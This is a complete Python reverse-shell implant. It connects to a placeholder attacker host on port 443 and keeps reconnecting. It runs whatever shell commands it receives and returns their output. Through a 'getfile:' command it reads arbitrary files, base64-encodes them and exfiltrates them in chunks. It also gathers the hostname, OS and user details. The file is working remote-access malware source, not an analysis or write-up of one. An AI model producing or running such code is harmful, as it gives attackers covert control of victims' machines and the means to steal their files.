import socket
import subprocess
import os
import platform
import time
import sys
import base64

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        return output if output else "Command executed successfully"
    except Exception as e:
        return str(e)

def get_file_content(filepath):
    try:
        print(f"[*] Attempting to read file: {filepath}")
        with open(filepath, 'rb') as f:
            content = f.read()
            encoded = base64.b64encode(content)
            print(f"[*] File read successfully, size: {len(content)} bytes")
            return encoded.decode('utf-8')
    except Exception as e:
        print(f"[*] Error reading file: {e}")
        return f"ERROR: {str(e)}"

def get_os_info():
    try:
        if platform.system() == "Windows":
            # Get Windows version
            import subprocess
            output = subprocess.check_output('ver', shell=True).decode()
            return output.strip()
        else:
            # Get Linux/Unix version
            with open('/etc/os-release') as f:
                lines = f.readlines()
                for line in lines:
                    if line.startswith('PRETTY_NAME='):
                        return line.split('=')[1].strip().strip('"')
            return f"{platform.system()} {platform.release()}"
    except:
        return f"{platform.system()} {platform.release()}"

def connect_to_server():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(('<DEATHSTAR_IP>', 443))
            print("[+] Connected to server")

            # Send initial empty data
            sock.send(b"\n")
            
            while True:
                command = sock.recv(1024).decode('utf-8').strip()
                print(f"[*] Received command: {command}")
                
                if not command:
                    continue
                
                if command == "die":
                    print("[!] Received die command. Shutting down...")
                    sock.close()
                    sys.exit(0)
                
                if command.startswith("getfile:"):
                    filepath = command[8:]  # Remove "getfile:" prefix
                    print(f"[*] Get file request for: {filepath}")
                    output = get_file_content(filepath)
                    # Send in chunks if needed
                    chunk_size = 1024 * 1024  # 1MB chunks
                    for i in range(0, len(output), chunk_size):
                        chunk = output[i:i + chunk_size]
                        sock.send(chunk.encode('utf-8'))
                    # Send end marker
                    sock.send(b"<<EOF>>\n")
                    print(f"[*] File sent successfully")
                elif command == "osinfo":
                    output = get_os_info()
                elif command == "hostname":
                    output = platform.node()
                elif command == "whoami":
                    if platform.system() == "Windows":
                        output = os.getenv("USERNAME")
                    else:
                        output = os.getenv("USER")
                else:
                    output = execute_command(command)
                
                if not output:
                    output = "Command executed with no output"
                
                print(f"[*] Sending output: {output}")
                sock.send(output.encode('utf-8') + b'\n')
                
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            
        print("[*] Attempting to reconnect in 5 seconds...")
        time.sleep(5)

if __name__ == "__main__":
    connect_to_server() 
